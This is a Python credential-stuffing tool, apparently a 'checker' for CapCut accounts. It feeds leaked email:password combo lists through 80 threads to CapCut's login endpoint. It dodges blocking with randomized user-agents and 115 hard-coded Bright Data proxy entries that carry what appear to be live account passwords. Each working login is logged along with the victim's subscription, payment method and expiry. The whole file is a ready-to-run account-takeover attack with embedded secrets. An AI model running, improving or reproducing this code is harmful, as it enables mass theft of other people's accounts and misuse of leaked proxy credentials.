import requests
import threading
import queue
import time
import random

hit_dosyasi = "CAPCUT_hits.txt"
thread_sayisi = 80

# Khởi tạo các khóa an toàn luồng (Thread Locks)
file_lock = threading.Lock()
proxy_lock = threading.Lock()

# Tích hợp sẵn 115 Proxy Bright Data của bạn trực tiếp vào code
DEFAULT_PROXIES = [
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy9-ip-178.171.63.212:ttu3gus3yf5i",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy9-ip-176.113.40.179:ttu3gus3yf5i",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy9-ip-158.46.201.208:ttu3gus3yf5i",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy9-ip-85.28.48.233:ttu3gus3yf5i",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy9-ip-75.153.80.88:ttu3gus3yf5i",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy9-ip-158.46.142.93:ttu3gus3yf5i",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy9-ip-82.117.81.6:ttu3gus3yf5i",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy9-ip-178.171.84.53:ttu3gus3yf5i",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy9-ip-176.100.139.163:ttu3gus3yf5i",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy9-ip-176.117.65.169:ttu3gus3yf5i",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy9-ip-158.46.209.215:ttu3gus3yf5i",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy9-ip-178.171.26.254:ttu3gus3yf5i",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy9-ip-31.204.23.208:ttu3gus3yf5i",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy9-ip-23.26.142.138:ttu3gus3yf5i",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy9-ip-158.46.212.31:ttu3gus3yf5i",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-168.158.37.7:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-178.171.100.196:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-91.108.218.214:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-75.153.112.146:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-178.171.124.241:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-168.158.211.119:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-104.232.200.226:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-212.102.157.165:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-161.77.47.244:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-168.158.48.146:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-161.77.160.37:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-66.17.231.39:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-213.109.190.74:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-176.100.138.249:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-80.254.218.215:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-64.49.189.156:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-158.46.200.171:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-178.171.71.250:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-66.227.13.127:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-178.171.80.174:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-158.46.204.66:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-88.223.245.38:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-96.126.153.168:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-85.28.55.28:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-178.171.57.254:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-45.158.224.237:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-79.135.147.55:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-80.89.0.39:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-212.236.130.219:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-104.232.207.212:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-185.246.218.103:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-72.56.169.128:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-81.181.173.185:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-89.184.9.218:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-78.41.87.189:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-85.28.43.20:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-200.239.227.95:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-80.96.39.70:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-185.95.101.175:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-37.49.147.203:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-64.49.184.31:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-200.152.136.192:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-95.134.73.169:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-91.124.44.214:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-79.135.145.202:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-91.124.47.149:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-158.46.153.36:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-185.96.81.139:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-23.26.142.136:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-95.135.97.38:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-89.184.27.147:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-31.105.84.155:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-31.98.207.189:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-168.158.223.107:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-89.184.7.56:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-31.98.146.221:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-178.171.5.230:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-200.152.131.103:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-200.160.45.230:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-31.105.93.12:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-31.105.94.133:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-178.171.95.184:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-168.158.15.48:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-31.105.5.183:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-95.135.3.14:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-185.96.38.124:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-178.171.96.212:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-64.49.180.123:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-80.96.148.92:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-102.134.36.125:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-144.225.83.245:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-86.62.54.3:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-200.160.46.203:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-200.152.130.105:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-91.108.209.250:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-89.184.23.177:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-46.148.209.136:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-178.171.6.35:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-31.105.169.197:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-103.52.9.28:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-166.0.203.4:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-72.9.162.203:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-31.105.156.249:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-31.105.158.196:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-31.105.223.245:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-31.105.177.186:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-31.105.245.241:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-31.105.229.166:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-102.134.62.141:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-104.232.203.252:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-86.109.77.208:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-51.194.148.102:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-178.171.118.119:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-82.117.80.42:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-200.234.141.130:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-45.158.225.37:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-72.56.171.224:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-31.204.19.15:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-91.108.208.53:lai5y1j537xh",
    "brd.superproxy.io:44445:brd-customer-hl_a789acc9-zone-isp_proxy11-ip-31.105.203.90:lai5y1j537xh",
]

def format_proxy(proxy_str):
    """Chuyển đổi định dạng host:port:user:pass thành định dạng chuẩn của requests library"""
    proxy_str = proxy_str.strip()
    if not proxy_str:
        return None
    parts = proxy_str.split(":")
    if len(parts) == 4:
        host, port, user, pwd = parts
        uri = f"http://{user}:{pwd}@{host}:{port}"
        return {"http": uri, "https": uri}
    elif len(parts) == 2:
        uri = f"http://{parts[0]}:{parts[1]}"
        return {"http": uri, "https": uri}
    elif proxy_str.startswith("http"):
        return {"http": proxy_str, "https": proxy_str}
    return None

def proxy_yukle(dosya):
    try:
        with open(dosya, "r", encoding="utf-8") as f:
            lines = [x.strip() for x in f.readlines() if x.strip()]
            formatted = [format_proxy(x) for x in lines if format_proxy(x)]
            if formatted:
                return formatted
    except Exception:
        pass
    # Nếu không đọc được từ file, dùng trực tiếp danh sách tích hợp sẵn
    return [format_proxy(x) for x in DEFAULT_PROXIES if format_proxy(x)]

def combo_yukle(dosya):
    try:
        with open(dosya, "r", encoding="utf-8") as f:
            return [x.strip() for x in f.readlines() if x.strip()]
    except Exception as e:
        print(f"[LỖI] Không thể đọc file combo: {e}")
        return []

def kaydet_hit(veri):
    with file_lock:
        with open(hit_dosyasi, "a", encoding="utf-8") as f:
            f.write(veri + "\n\n" + "_"*50 + "\n\n")

def hesap_kontrol(email, sifre, proxy):
    try:
        headers = {
            "user-agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/{random.randint(500,600)}.{random.randint(1,50)} (KHTML, like Gecko) Chrome/{random.randint(100,137)}.0.{random.randint(1000,4000)}.0 Safari/{random.randint(500,600)}.{random.randint(1,50)}"
        }
        data = f"mix_mode=1&email={email}&password={sifre}&fixed_mix_mode=1"
        r = requests.post(
            "https://www.capcut.com/passport/web/email/login/?aid=348188&account_sdk_source=web&passport_jssdk_version=1.0.7-beta.2&language=en",
            data=data,
            headers=headers,
            proxies=proxy,
            timeout=15
        )

        if r.status_code == 403:
            return "proxy_ban", None

        response_text = r.text
        if '"message":"success"' in response_text and '"user_id"' in response_text:
            try:
                app_id_str = response_text.split('"app_id":')[1].split(",")[0]
                app_id = int(app_id_str)
                
                sub_req = requests.post(
                    "https://commerce-api-sg.capcut.com/commerce/v3/trade/subscription_infos",
                    json={"scene": ["vip"], "vip_levels": ["vip"], "app_id": app_id},
                    headers={"appid": str(app_id)},
                    proxies=proxy,
                    timeout=15
                )
                sub_json = sub_req.json()
                data_list = sub_json.get("data", [{}])
                sub_info = data_list[0] if data_list else {}
                
                abonelik = sub_info.get("display_subscription_info", "FREE")
                tutar = sub_info.get("amount", "0")
                para = sub_info.get("currency_code", "")
                odeme = sub_info.get("payment_method", "")
                bitis = sub_info.get("vip_end_time", "")

                capture = f"Subscription: {abonelik} | Amount: {tutar} {para} | Payment Method: {odeme} | Expiry: {bitis}"
            except Exception:
                capture = "@mrzyko"

            kaydet_hit(f"{email}:{sifre} | {capture}")
            print(f"[HIT] {email}:{sifre} | {capture}")
            return "hit", None

        elif "error_code" in response_text or '"message":"error"' in response_text:
            return "bad", None
        else:
            return "unknown", None

    except requests.exceptions.RequestException:
        return "proxy_error", None

def worker():
    global proxy_index
    while True:
        try:
            email, sifre = combo_kuyruk.get(timeout=3)
        except queue.Empty:
            break

        if not proxyler:
            hesap_kontrol(email, sifre, None)
            combo_kuyruk.task_done()
            continue

        while True:
            with proxy_index_lock:
                if proxy_index >= len(proxyler):
                    proxy_index = 0
                proxy = proxyler[proxy_index]
            
            durum, _ = hesap_kontrol(email, sifre, proxy)

            if durum == "proxy_error" or durum == "proxy_ban":
                with proxy_index_lock:
                    proxy_index += 1
                continue
            else:
                break
        combo_kuyruk.task_done()

if __name__ == "__main__":
    combo_dosya = input("Combo File (.txt): ").strip()
    # Nếu không nhập tên file proxy, script sẽ tự động dùng 115 proxy tích hợp sẵn
    proxy_dosya = input("Proxy File (.txt) [Enter để dùng 115 proxy tích hợp]: ").strip()

    combolar = combo_yukle(combo_dosya)
    proxyler = proxy_yukle(proxy_dosya) if proxy_dosya else [format_proxy(x) for x in DEFAULT_PROXIES if format_proxy(x)]

    print(f"[INFO] Đã nạp thành công {len(proxyler)} proxy vào hệ thống xoay vòng.")

    combo_kuyruk = queue.Queue()
    for c in combolar:
        if ":" in c:
            parts = c.split(":", 1)
            combo_kuyruk.put((parts[0].strip(), parts[1].strip()))

    proxy_index = 0
    proxy_index_lock = threading.Lock()
    
    threadler = []
    print(f"[INFO] Đang chạy với {thread_sayisi} luồng...")
    for _ in range(thread_sayisi):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        threadler.append(t)

    for t in threadler:
        t.join()
    
    print("\n[INFO] Đã hoàn thành quá trình kiểm tra!")
